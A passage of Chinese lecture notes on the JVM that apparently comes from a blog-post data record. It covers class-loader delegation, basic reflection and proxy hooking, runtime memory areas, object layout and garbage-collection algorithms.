传递性\n\n程序在运行过程中，遇到了一个未知的类，它会选择哪个 ClassLoader 来加载它呢？虚拟机的策略是使用调用者 Class 对象的 ClassLoader 来加载当前未知的类。何为调用者 Class 对象？就是在遇到这个未知的类时，虚拟机肯定正在运行一个方法调用（静态方法或者实例方法），这个方法挂在哪个类上面，那这个类就是调用者 Class 对象。前面我们提到每个 Class 对象里面都有一个 classLoader 属性记录了当前的类是由谁来加载的。\n\n因为 ClassLoader 的传递性，所有延迟加载的类都会由初始调用 main 方法的这个 ClassLoader 全全负责，它就是 AppClassLoader。\n\n#### 双亲委派\n\n双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。\n\n使用双亲委派模型的好处在于**Java类随着它的类加载器一起具备了一种带有优先级的层次关系**。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。\n\n![类加载器的双亲委派模型](https://img-blog.csdn.net/20160506184936657)\n\n**双亲委派模型的系统实现**\n\n在java.lang.ClassLoader的loadClass()方法中，先检查是否已经被加载过，若没有加载则调用父类加载器的loadClass()方法，若父加载器为空则默认使用启动类加载器作为父加载器。如果父加载失败，则抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。\n\n```java\nprotected synchronized Class<?> loadClass(String name,boolean resolve)throws ClassNotFoundException{\n    //check the class has been loaded or not\n    Class c = findLoadedClass(name);\n    if(c == null){\n        try{\n            if(parent != null){\n                c = parent.loadClass(name,false);\n            }else{\n                c = findBootstrapClassOrNull(name);\n            }\n        }catch(ClassNotFoundException e){\n            //if throws the exception ,the father can not complete the load\n        }\n        if(c == null){\n            c = findClass(name);\n        }\n    }\n    \n    if(resolve){\n        resolveClass(c);\n    }\n    return c;\n}\n```\n\n注意，双亲委派模型是Java设计者推荐给开发者的类加载器的实现方式，并不是强制规定的。大多数的类加载器都遵循这个模型，但是JDK中也有较大规模破坏双亲模型的情况，例如线程上下文类加载器（Thread Context ClassLoader）的出现，具体分析可以参见《深入理解Java虚拟机》。\n\n## Hook\n\n### 什么是Hook\n\nhook我认为更像是一种思想，而非一门单独的技术，其实就是通过一些旁门左道去通过代理修改别人的代码来达成一些意想不到的功能。而通过这些旁门左道其实是没办法随心所欲的修改代码的，所以我们需要从某些地方入手，这些地方被称作**hook点**。\n\n### 怎么实现Hook\n\n![img](https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg)\n\n那我就讲讲最基础的反射/动态代理Hook吧。\n\n假如我们导入的外部库的网络请求部分有这么一段代码:\n\n~~~kotlin\nobject ServiceHolder {\n    val apiService: IWebServiceRepository = WebServiceRepository()\n    // ...\n}\n\n// WebServiceRepository\nclass WebServiceRepository : IWebServiceRepository {\n    private val BASE_URL = \"https://api.bifrost.kim\"\n    \n    override fun getJsonData(): Data {\n        // ...\n    }\n}\n~~~\n\n然而它的接口改了，我们需要修改一下请求的方式\n\n最简单的方法就是我们直接动态代理apiService，然后反射放进去。\n\n但InvocationHandler提供的动态代理也许不是很方便，只能在头部或者尾部插入逻辑。即便我们只需要修改部分字符串，就得重写整个网络请求方法的逻辑。\n\n那么更好的方法是什么呢，正是字节码插桩，我们使用字节码生成一个一样的类，再用asm稍微的修改这其中的部分逻辑即可。\n\n### 利用LSposed实现全局Hook (有时间再研究)\n\n> 有时间再说吧 我没研究（\n","source":"_posts/simple-in-simple-out-jvm.md","raw":"---\ntitle: 浅入浅出JVM\ndate: 2022-07-31\nauthor: 寒雨\nhide: false\nsummary: 红岩讲课的课件\ncategories: 笔记\ntags:\n  - JVM\n  - 字节码\n  - ASM\n---\n\n# 浅入浅出JVM & Hook\n\n> 其中混杂有相当多的个人理解，如有谬误烦请学长指正\n\n## 什么是JVM\n\n**Java Virtual Machine**，即Java虚拟机。那么虚拟机又是什么？\n\n> 虚拟机（Virtual Machine）指通过软件模拟的具有完整硬件系统功能的、运行在一个完全隔离环境中的完整计算机系统。\n\n但不同于其他虚拟机的是，JVM模拟的是一个无法直接在硬件设备上安装的计算机系统——究其根本，它就是一个在各个系统中具有基本相同行为的**跨平台程序**，它提供了一系列可供Java语言调用的API，而这些API都可以溯源到**本地方法**(也就是native修饰的方法)。这些方法在native语言层面实现，且在不同的系统上有着不同逻辑的实现。但抽象到java语言层面，它们的作用是一致的。\n\n就这样，JVM为我们在各个系统提供了一个具有统一“系统“的虚拟机环境，我们不需要让外部的实际系统认识我们的编译出来的软件，我们只需要让JVM认识它就可以了。每当我们使用`java -jar`命令运行一个jar文件, 实际上都先运行了JVM，再由JVM来**运行时**的解释并加载jar包中的类文件，并通过META-INF中的主类信息找到主类并执行其中的main方法。\n\n因此，我们使用Java等依赖于JVM的语言编写程序时如果只调用Java语言为我们提供的API，我们编写的代码就可以在一切支持JVM的系统上运行。正所谓 ***Write once, run anywhere***。你会发现很多直接编译为native的语言(C, C++, Rust, Go...)甚至需要在对应的系统编译才能运行，这也正是JVM系语言相对于其他语言的优势之一。\n\n## JVM的种类\n\n这里介绍主要的几种\n\n### Sun Classic VM\n\n> 万物伊始\n\n其中使用的技术在今天看来已经相当原始，这款虚拟机的使命也早已终结，但凭它”世界上第一款商用Java虚拟机“的头衔，便足以让它被历史铭记。\n\n### HotSpot VM\n\n> 武林盟主\n\n毫无疑问是当今被最广泛使用的Java虚拟机\n\n### Graal VM\n\n> 明日之星\n\n创造性的将字节码编译为另一种中间媒介，同时支持将其他语言编译为这种中间媒介，实现多语言之间的相互调用，JVM将不再专属于字节码。举个例子，我们甚至可以在Java中使用Node.js的Express框架来开发后端程序。\n\n### Dalvik VM\n\n> 为Android而生\n\n> Dalvik是[Google](https://baike.baidu.com/item/Google/86964)公司自己设计用于Android平台的[虚拟机](https://baike.baidu.com/item/虚拟机/104440)。Dalvik虚拟机是Google等厂商合作开发的Android移动设备平台的核心组成部分之一。它可以支持已转换为 .dex（即Dalvik Executable）格式的Java应用程序的运行，.dex格式是专为Dalvik设计的一种[压缩格式](https://baike.baidu.com/item/压缩格式/2844535)，适合内存和处理器速度有限的系统。Dalvik 经过优化，允许在有限的内存中同时运行多个虚拟机的实例，并且每一个Dalvik 应用作为一个独立的Linux 进程执行。独立的进程可以防止在虚拟机崩溃的时候所有程序都被关闭。\n>\n> 很长时间以来，Dalvik虚拟机一直被用户指责为拖慢安卓系统运行速度不如IOS的根源。\n>\n> 2014年6月25日，Android L 正式亮相于召开的谷歌I/O大会，Android L 改动幅度较大，[谷歌](https://baike.baidu.com/item/谷歌/117920)将直接删除Dalvik，代替它的是传闻已久的ART。\n\n### ART\n\n> ART(Android Runtime)是Android 4.4发布的，用来替换Dalvik虚拟，Android 4.4之前默认采用的还是DVM，系统会提供一个选项来开启ART模式。在Android 5.0时，默认采用ART，DVM从此退出历史舞台。\n\n**Dalvik虚拟机执行的是dex字节码，ART虚拟机执行的是本地机器码。**\n\n> Dalvik执行的是dex字节码，依靠JIT编译器去解释执行，运行时动态地将执行频率很高的dex字节码翻译成本地机器码，然后在执行，但是将dex字节码翻译成本地机器码是发生在应用程序的运行过程中，并且应用程序每一次重新运行的时候，都要重新做这个翻译工作，因此，即使采用了JIT，Dalvik虚拟机的总体性能还是不能与直接执行本地机器码的ART虚拟机相比。 安卓运行时从Dalvik虚拟机替换成ART虚拟机，并不要求开发者重新将自己的应用直接编译成目标机器码，也就是说，应用程序仍然是一个包含dex字节码的apk文件。所以在安装应用的时候，dex中的字节码将被编译成本地机器码，之后每次打开应用，执行的都是本地机器码。移除了运行时的解释执行，效率更高，启动更快。（安卓在4.4中发布了ART运行时）\n\nART优点:\n\n- 系统性能显著提升\n- 应用启动更快、运行更快、体验更流畅、触感反馈更及时\n- 续航能力提升\n- 支持更低的硬件\n\nART缺点:\n\n- 更大的存储空间占用，可能增加10%-20%\n- 更长的应用安装时间\n\n> 应廖老师的要求，讲讲ART的GC\n\n// TODO 内容好多，我太难了\n\n## 自行编译JDK8\n\n非常麻烦，看看有没有时间去做。自行编译jvm可以对jvm打断点，还是很有帮助的。\n\n// TODO\n\n## 内存管理\n\n对于从事C，C++程序开发的开发人员，在内存管理领域，他们需要手动分配/释放内存。虽然这是一件繁琐的工作，但这也使C++等一系列需要手动管理内存的语言能做到更多的事情。例如MMKV，它的底层原理使用C++实现——手动管理了一块堆外内存。(但其实Java也并非做不到这个，Unsafe类中提供了手动分配/释放堆外内存的方法，并且提供了跟C++一样的面向指针的操作方法。)\n\n得益于JVM强大的内存管理机制，JVM语言程序员不需要手动为每个对象分配/释放堆内存，一切看起来相当美好。但正是因为我们将内存管理的程序交给了JVM，一旦出现内存泄漏的问题，如果不清楚JVM内存管理机制的原理就很难解决问题。\n\n### 运行时数据区\n\nJava虚拟机在执行Java程序的过程中会把它管理的内存划分为若干个不同的数据区域:\n\n![Java虚拟机运行时数据区](http://images2015.cnblogs.com/blog/1182497/201706/1182497-20170616192739978-1176032049.png)\n\n#### 程序计数器\n\n程序计数器占用了比较小的一块内存空间，可以看作是**当前线程**所执行字节码的行号(字节码的行号，不是代码的行号，字节码应该包含有对应代码行数的信息)指示器。字节码解释器在工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令, 它是**程序控制流**的指示器，流程控制，异常处理，线程恢复都需要依赖它来实现。\n\nJava虚拟机的多线程是通过**线程轮流切换，分配处理器时间**实现的，因此在任何一个确定的时刻，一个内核都只会执行一条线程中的指令（即并发执行)。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个程序计数器。因此程序计数器是**线程私有**的。\n\n**---这里稍微讲讲Java的线程调度 & 协程---**\n\n这里引用一段别人的话，上面我可能表述得不是很准确\n\n> 因为Java的多线程也是依靠时间片轮转算法进行的，因此一个CPU同一时间也只会处理一个线程，当某个线程的时间片消耗完成后，会自动切换到下一个线程继续执行，而当前线程的执行位置会被保存到当前线程的程序计数器中，当下次轮转到此线程时，又继续根据之前的执行位置继续向下执行。\n\n> **单核**的CPU是一种假的多线程，因为在一个时间单元内，也只能执行一个线程的任务。同时间段内有多个线程需要CPU去运行时，CPU也只能交替去执行多个线程中的一个线程，但是由于其执行速度特别快，因此感觉不出来。\n\n按照上面的说法，我们发现，其实线程可以看作一个任务，**内核一直在很多线程之间反复横跳**: 这个做一会儿就停下来，去做下一个。\n\n但这里就会出现一个问题，使用`Thread.sleep(long)`停下的线程，内核会怎么办？答案是仍然会到他身上去，但什么也不做，就白白浪费了给cpu分配的时间分片。这就是这种设计的局限性，且不说创建一个新的线程相当占内存，即便是内存足够，并发效率也相当差（其实跟Java当时刚出的时候的其他语言比起来已经很不错了）。线程池当然也会有这个问题。\n\n那么理想的状态是什么呢？我让这个线程休眠了，你cpu就不要管他，把时间分给其他有任务的线程。\n\n两条路，要么你从内核层面去改良，去教cpu做事。对应了`Thread#yield()`,让当前线程把自己的时间让给其他线程，实现**抢占式调度**。\n\n另外一条道路就是协程，从用户层面改良，cpu教我做事。\n\n> 如果你觉得Thread#sleep会浪费并发效率，那你就不要用！你要提交能充分利用我效率的任务，而不是一味的谩骂和指责。\n>\n> ​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t—— CPU\n\n既然`Thread.sleep()`会导致并发效率低下，那我就不用！在线程下面再区分出来一个协程的概念，在这里把无用的任务过滤一遍，再交给线程。这样每个内核对每个线程的利用率就提高了，也可以提高并发效率。\n\n是不是感觉java的线程也挺像协程的:)，之前蔷神讲协程也说过线程也可以看成协程的一种实现。我个人觉得他们唯一不同的地方就在于线程是由内核来调度，处于**内核态**，协程由用户编写的逻辑进行调度，处于**用户态**。协程其实是减少了内核的**无用的**工作量，所以并发吞吐量更大。\n\n![](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/飞书20220708-161709.jpg)\n\n**---私货结束---**\n\n程序计数器是JVM唯一一个不会产生OOM的内存区域。\n\n> 在执行Java方法时，程序计数器的值为正在执行的虚拟机字节码指令的地址\n>\n> 在执行本地方法时，程序计数器的值为空(undefined)\n\n#### 虚拟机栈\n\n其实大家应该都知道所谓堆和栈的概念吧。即便Jvm的堆和栈你没有了解过，在C/C++课上应该也了解过堆栈的概念吧？虽然C++这种直接编译到native的语言中的堆和栈与Jvm语言中的堆和栈并不是一个东西——JVM是virtual machine，是虚拟机，它的一切特性都是软件模拟的。C++中我们执行程序直接使用硬件的堆栈，而Java我们执行程序使用JVM为我们模拟出来的堆栈。\n\n与程序计数器一样，虚拟机栈也是线程私有的, 它的生命周期与线程相同，随线程的释放而释放。每当一个方法被调用，虚拟机都会同步创建一个栈帧用于存储**局部变量表，操作数栈，动态连接，方法出口**等信息。每一个方法从调用到返回的过程就对应着一个栈帧入栈到出栈的过程。\n\n这里从别人那里抄来了一个流程图解\n\n>可能听起来有点懵逼，这里我们来模拟一下整个虚拟机栈的运作流程，先编写一个测试类：\n>\n>```java\n>public class Main {\n>    public static void main(String[] args) {\n>        int res = a();\n>        System.out.println(res);\n>    }\n>\n>    public static int a(){\n>        return b();\n>    }\n>\n>    public static int b(){\n>        return c();\n>    }\n>\n>    public static int c(){\n>        int a = 10;\n>        int b = 20;\n>        return a + b;\n>    }\n>}\n>```\n>\n>当我们的主方法执行后，会依次执行三个方法`a() -> b() -> c() -> 返回`\n>\n>可以看到在编译之后，我们整个方法的最大操作数栈深度、局部变量表都是已经确定好的，当我们程序开始执行时，会根据这些信息封装为对应的栈帧，我们从`main`方法开始看起：\n>\n>![image-20220131142625842](https://tva1.sinaimg.cn/large/008i3skNly1gywucw6rcyj30ws0gyq4h.jpg)\n>\n>接着我们继续往下，调用方法`a()`，这时当前方法就不会继续向下运行了，而是去执行方法`a()`，那么同样的，将此方法也入栈，注意是放入到栈顶位置，`main`方法的栈帧会被压下去：\n>\n>![image-20220131143641690](https://tva1.sinaimg.cn/large/008i3skNly1gywuhfjok5j30v40g875z.jpg)\n>\n>这时，进入方法a之后，又继而进入到方法b，最后在进入c，因此，到达方法c的时候，我们的虚拟机栈变成了：\n>\n>![image-20220131144209743](https://tva1.sinaimg.cn/large/008i3skNly1gywun3qnp6j30zq0h6jtq.jpg)\n>\n>现在我们依次执行方法c中的指令，最后返回a+b的结果，在方法c返回之后，也就代表方法c已经执行结束了，栈帧4会自动出栈，这时栈帧3就得到了上一栈帧返回的结果，并继续执行，但是由于紧接着马上就返回，所以继续重复栈帧4的操作，此时栈帧3也出栈并继续将结果交给下一个栈帧2，最后栈帧2再将结果返回给栈帧1，然后栈帧1就可以继续向下运行了，最后输出结果。\n>\n>![image-20220131144955668](https://tva1.sinaimg.cn/large/008i3skNgy1gywxbv24qlj30tk0giwg2.jpg)\n\n虚拟机栈并不是无限大的，如果其中堆积的栈帧数量太多就会**爆栈**(StackOverFlowException)，我们可以通过`-Xss size`的vm options设置虚拟机的栈大小。\n\n常见关于虚拟机栈的问题:\n\n垃圾回收是否涉及栈内存？\n\n- **不涉及**，垃圾回收只涉及堆内存。在方法返回后其对应的栈帧就会出栈，所以不需要回收内存。\n\n栈内存分配得越大越好吗?\n\n- **不**，栈内存大了，其他的内存区域就小了。有时你对递归调用并没有这么大的需求，毕竟所有的递归调用都可以通过循环实现。\n\n#### 本地方法栈\n\n本地方法栈其实跟虚拟机栈的作用非常相似，只是他们一个为字节码层面的方法服务，一个为本地方法服务。\n\n#### Java堆\n\nJava堆是虚拟机管理的内存中最大的一块, 用来存放对象实例。也是GC的主战场。不同于以上几个区域，Java堆是线程间共享的。所以在访问堆中存储的数据需要注意线程安全问题。\n\n#### 方法区\n\n与Java堆一样是线程间共享的区域，它主要用于存储已经被虚拟机加载的**类型信息，常量，静态变量，即时编译器编译后的代码缓存**。虽然《Java虚拟机规范》中把方法区描述为堆的一个逻辑部分，但它却有一个别名叫做“非堆”(Non-Heap)，目的是与Java堆区分开来。\n\n你可能会听说方法区就是堆的永久代这个说法，实际不是这样的。仅仅只是因为HotSpot VM选择使用永久代来实现方法区，但实际上这是两个完全不同的概念。\n\n> 可能看起来有点突兀，只是写到这里的时候突然想说一下JIT（即时编译器）的工作流程\n>\n> 这里可以发现其实jvm并非单纯解释执行字节码，而是在解释量达到一定阈值后触发即时编译，将编译后的字节码缓存到方法区，下次调用时便可以直接执行编译后的机器码。（也就是说常用的方法会被缓存为机器码）\n>\n> ![img](https://pic4.zhimg.com/80/v2-b6f9389c136957504a5c1ae563aba5f3_1440w.jpg)\n\n**运行时常量池**\n\n运行时常量池是方法区的一部分。在类加载时JVM读取class文件中常量池表的信息，并把它存入运行时常量池。至于常量池表，下面我们讲字节码的时候再详细介绍，现在我们只需要知道它是存放程序运行所需的常量即可。\n\n而运行时常量池的另外一个重要特征就是具备**动态性**，Java并不要求常量一定只有在编译期才能产生，这点与c++不同，运行期间也可以有新的常量进入常量池。这种特性被开发人员利用得比较多的就是`String#intern()`方法。\n\n> 关于String#intern方法，直接使用双引号声明的字符串都会直接存储在常量池中\n>\n> 而非通过双引号声明出来的字符串可以使用String#intern方法查询常量池中是否存在该字符串，若不存在就会将其放入常量池\n>\n> 是不是又可以理解java的字符串对象为什么不可变了，因为我们一般获取的字符串都会存储在常量池中，如果直接对字符串对象动刀岂不是没有意义了\n>\n> 这也是为什么不推荐直接通过String的构造方法获得一个String对象的原因，因为这样会new出来一个新对象，而非存储在常量池中的字符串\n\n### 对象\n\n#### 创建对象大致流程\n\n##### 类加载检查\n\n当jvm遇到一条字节码new指令的时候，首先将会检查这个指令的参数是否能在常量池定位到一个类的符号引用，并且检查这个符号引用代表的类是否已经被加载，解析和初始化过。如果没有，先执行相应的类加载过程。\n\n##### 分配内存\n\n- 指针碰撞\n\n​\t在Java堆规整的情况下（所有对象的地址连续），为新对象分配内存只需要把指针向空闲区域移动\n\n- 空闲列表\n\n​\t在Java堆内存存放分散的情况下，我们必须维护一个列表，记录哪些内存块是可用的，分配内存时从列表中找到合适的内存块，并更新表上的记录。\n\n**分配内存这个过程需要保证线程安全**，一般采取两种做法: \n\n- 对分配内存空间的动作进行同步处理——实际上虚拟机是采用CAS配上失败重试的方式保证更新操作的原子性\n- 为每条线程预先分配一块堆内存，即本地线程分配缓冲，哪个线程要分配内存，就在哪个线程的本地缓冲区分配。本地缓冲区消耗完了才会锁同步。\n\n##### 初始化内存空间\n\n即为对象的成员变量赋初值，没有赋初值的初始化为类型对应零值（引用类型对应null）\n\n##### 初始化对象头 (Object Header)\n\nJava虚拟机需要对对象进行必要的设置，例如这个对象是哪个类的实例，如何才能找到类的元数据信息，对象的hash code(实际上会延后到调用`Object#hashCode()`才会计算)，对象的GC分代年龄等信息，这些信息会存放在对象的**对象头**中。\n\n##### 调用构造器\n\n使用正常途径新建对象必不可少的环节，当然使用`Unsafe#allocateInstance()`创建对象是可以跳过这一步的。(Gson的反序列化出来的对象就是使用它新建的，所以说它不适合Kt，因为Kt的空安全检查逻辑实际上是写在构造器里的，Gson这样做直接跳过了空安全检查)\n\n#### 对象的内存布局\n\n在HotSpot虚拟机中，对象在堆内存中的储存布局可以划分为三个部分: 对象头(Header)，实例数据(Instance Data)和对齐填充(Padding)。\n\n对象头中包含两类信息: 第一类是用于存储对象自身的运行时数据，如HashCode，GC分代年龄，锁状态标志，线程持有的锁，偏向线程ID，偏向时间戳等，这部分数据的长度在32位和64位的虚拟机中分别为32和64个bit，官方称它为“Mark World”。\n\n实例数据部分是对象真正存储的有效信息，即我们在程序代码中所定义的字段等内容\n\n对齐填充部分只是起到一个占位符的作用，由于HotSpot虚拟机的自动内存管理系统要求对象起始地址必须是8字节的整数倍，也就是说任何对象的大小都必须是8字节的倍数。对象头部分已经被精心设计为8字节的倍数（1倍或2倍）。因此，如果对象实例数据部分没有对齐的话，就需要通过对齐填充来补全。\n\n#### 对象的访问定位\n\n创建对象自然是为了使用对象，我们的java程序一般通过栈上保存的**reference**(即引用)来操作堆上的具体对象。但Java虚拟机规范中只规定了这个reference类型是一个指向对象的引用，并没有强制要求这个引用应该如何定位，访问对象。所以对象访问方式也是由虚拟机实现而定的，主流的访问方式主要有使用**句柄**和**指针**。\n\n##### 句柄\n\n>  如果使用句柄访问的话，Java堆中将可能划分出一块内存来作为句柄池，reference中存储的就是对象的句柄地址，而句柄中包含了对象的实例数据与类型数据各自具体的地址信息\n\n使用句柄来访问的最大好处是reference中存储的是稳定的句柄地址，在对象被移动（GC时移动是很普遍的行为）时只会改变句柄中的实例数据指针，而reference本身不需要被修改。\n\n![飞书20220708-221205](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221205.png)\n\n##### 指针\n\n> 如果直接使用指针访问的话，Java堆中对象的内存布局就必须考虑如何放置访问类型的相关信息，reference中存储的直接就是对象地址，如果只是访问对象本身的话，就不需要多一次访问的开销。\n\n直接使用指针访问的好处在与速度快，它节省了一次指针定位的开销，由于对象访问在java中非常频繁，这笔开销相当不容小觑。**HotSpot**虚拟机采用指针访问\n\n![飞书20220708-221128](https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220708-221128.png)\n\n### 垃圾回收 (GC)\n\n大家应该都知道这个东西，我就不介绍了，直接切入正题\n\n#### 引用计数算法 & 可达性分析算法\n\n在堆中存放着Java世界中几乎所有的对象实例，垃圾收集器在堆中进行回收前，第一件事就是要确定这些对象之中还有哪些”存活“着，哪些已经“死去”。下面就讲一讲比较常见的两种判断的方法。\n\n##### 引用计数算法\n\n在对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就+1，引用失效时，计数器值就-1。任何时候计数器为0的对象是不可能再使用的，可以直接回收。\n\n虽然引用计数法简单高效，在大多数情况下是一个不错的算法。但主流的Java虚拟机并没有采用引用计数法进行内存管理，因为这个算法需要处理大量的意外情况——比如循环引用。\n\n##### 可达性分析算法\n\n当前主流的商用应用语言（Java，C#等）的内存管理子系统都是通过**可达性分析**算法来判定对象是否存活。这个算法的基本思路就是通过一系列称为**GC Roots**的根对象作为起始节点集，从这些节点开始，根据引用关系向下搜索，搜索过程中走过路径称为**引用链**，如果某个对象到GC Roots间没有任何引用链相连，则该对象**不可达**，就会被判定为可回收的对象。\n\n可作为GC Roots的对象:\n\n- 在虚拟机栈中引用的对象\n- 方法区中类静态属性引用的对象 （例如Java的引用类型静态变量）\n- 方法区中常量引用的对象 （例如字符串常量池中的引用）\n- 在本地方法栈中JNI引用的对象\n- Java虚拟机内部的引用，如**基本数据类型对应的Class对象**，一些常驻的异常对象（如NullPointerException）等，还有系统类加载器。\n\n![](https://img-blog.csdn.net/20180626084654607?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1YnVqaWFuX2w=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)\n\n#### 引用的类型\n\n实际上GC的回收策略并不死板，在剩余内存较少的时候，GC会尽可能回收多的对象来腾出更多的内存空间。那么我们要如何规定在剩余内存较少的时候才需要回收的那部分对象呢？于是在JDK1.2之后，Java对引用的概念进行了扩充，将引用分为**强引用，软引用，弱引用，虚引用**四种类型。\n\n##### 强引用\n\n最传统的引用定义，指程序代码中普遍存在的引用赋值。只要强引用关系存在，GC就不会回收被引用的对象。\n\n##### 软引用\n\n软引用用来描述一些还需要用到，但非必须的对象，在内存不足时，GC会回收掉只被软引用关联的对象。可以使用`SoftReference`类来实现软引用。\n\n##### 弱引用\n\n只被弱引用关联的对象只能存活到下一次GC到来前。可以使用`WeakReference`类来实现弱引用。\n\n##### 虚引用\n\n相当于没有引用，也没有办法通过这种引用得到关联的对象，为一个对象设置虚引用的唯一目的就是为了能在对象被回收时收到通知。可以使用`PhantomReference`类来实现虚引用。\n\n#### 垃圾收集算法\n\n##### 分代收集理论\n\n实际上，如果我们对堆中的每一个对象都依次判断是否需要回收，这样的效率其实是很低的，那么有没有更好地回收机制呢？第一步，我们可以对堆中的对象进行分代管理。\n\n比如某些对象，在多次垃圾回收时，都未被判定为可回收对象，我们完全可以将这一部分对象放在一起，并让垃圾收集器减少回收此区域对象的频率，这样就能很好地提高垃圾回收的效率了。\n\n因此，Java虚拟机将堆内存划分为**新生代**、**老年代**和**永久代**（其中永久代是HotSpot虚拟机特有的概念，在JDK8之前方法区实际上就是采用的永久代作为实现，而在JDK8之后，方法区由元空间实现，并且使用的是本地内存，容量大小取决于物理机实际大小，之后会详细介绍）这里我们主要讨论的是**新生代**和**老年代**。\n\n不同的分代内存回收机制也存在一些不同之处，在HotSpot虚拟机中，新生代被划分为三块，一块较大的Eden空间和两块较小的Survivor空间，默认比例为8：1：1，老年代的GC评率相对较低，永久代一般存放类信息等（其实就是方法区的实现）如图所示：\n\n![image-20220222151708141](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbaa6eg9j217a0ggta0.jpg)\n\n那么它是如何运作的呢？\n\n首先，所有新创建的对象，在一开始都会进入到新生代的Eden区（如果是大对象会被直接丢进老年代），在进行新生代区域的垃圾回收时，首先会对所有新生代区域的对象进行扫描，并回收那些不再使用对象：\n\n![image-20220222153104582](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyo48r0j21i20cqq4l.jpg)\n\n接着，在一次垃圾回收之后，Eden区域没有被回收的对象，会进入到Survivor区。在一开始From和To都是空的，而GC之后，所有Eden区域存活的对象都会直接被放入到From区，最后From和To会发生一次交换，也就是说目前存放我们对象的From区，变为To区，而To区变为From区：\n\n![image-20220222154032674](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmbyn34yfj21gk0d4gn5.jpg)\n\n接着就是下一次垃圾回收了，操作与上面是一样的，不过这时由于我们From区域中已经存在对象了，所以，在Eden区的存活对象复制到From区之后，所有To区域中的对象会进行年龄判定（每经历一轮GC年龄`+1`，如果对象的年龄大于`默认值为15`，那么会直接进入到老年代，否则移动到From区）\n\n![image-20220222154828416](https://tva1.sinaimg.cn/large/e6c9d24egy1gzmc6v1nzcj21h60d2q4l.jpg)\n\n最后像上面一样交换To区和From区，之后不断重复以上步骤。\n\n而垃圾收集也分为：\n\n* Minor GC   -   次要垃圾回收，主要进行新生代区域的垃圾收集。\n\n  * 触发条件：新生代的Eden区容量已满时。\n\n* Major GC   -   主要垃圾回收，主要进行老年代的垃圾收集。\n\n* Full GC      -    完全垃圾回收，对整个Java堆内存和方法区进行垃圾回收。\n\n  * 触发条件1：每次晋升到老年代的对象平均大小大于老年代剩余空间\n  * 触发条件2：Minor GC后存活的对象超过了老年代剩余空间\n  * 触发条件3：永久代内存不足（JDK8之前）\n  * 触发条件4：手动调用`System.gc()`方法\n\n  ![image-20220222205605690](https://tva1.sinaimg.cn/large/e6c9d24ely1gzml30209wj21u80ren3q.jpg)\n\n##### 标记-清除算法\n\n前面我们已经了解了整个堆内存实际上是以分代收集机制为主，但是依然没有讲到具体的收集过程，那么，具体的回收过程又是什么样的呢？首先我们来了解一下最古老的`标记-清除`算法。\n\n首先标记出所有需要回收的对象，然后再依次回收掉被标记的对象，或是标记出所有不需要回收的对象，只回收未标记的对象。实际上这种算法是非常基础的，并且最易于理解的（这里对象我就以一个方框代替了，当然实际上存放是我们前说到的GC Roots形式）\n\n![image-20220222165709034](https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg)\n\n虽然此方法非常简单，但是缺点也是非常明显的 ，首先如果内存中存在大量的对象，那么可能就会存在大量的标记，并且大规模进行清除。并且一次标记清除之后，连续的内存空间可能会出现许许多多的空隙，碎片化会导致连续内存空间利用率降低。\n\n##### 标记-复制算法\n\n既然标记清除算法在面对大量对象时效率低，那么我们可以采用标记-复制算法。它将容量分为同样大小的两块区域，\n\n标记复制算法，实际上就是将内存区域划分为大小相同的两块区域，每次只使用其中的一块区域，每次垃圾回收结束后，将所有存活的对象全部复制到另一块区域中，并一次性清空当前区域。虽然浪费了一些时间进行复制操作，但是这样能够很好地解决对象大面积回收后空间碎片化严重的问题。\n\n![image-20220222210942507](https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg)\n\n这种算法就非常适用于新生代（因为新生代的回收效率极高，一般不会留下太多的对象）的垃圾回收，而我们之前所说的新生代Survivor区其实就是这个思路，包括8:1:1的比例也正是为了对标记复制算法进行优化而采取的。\n\n##### 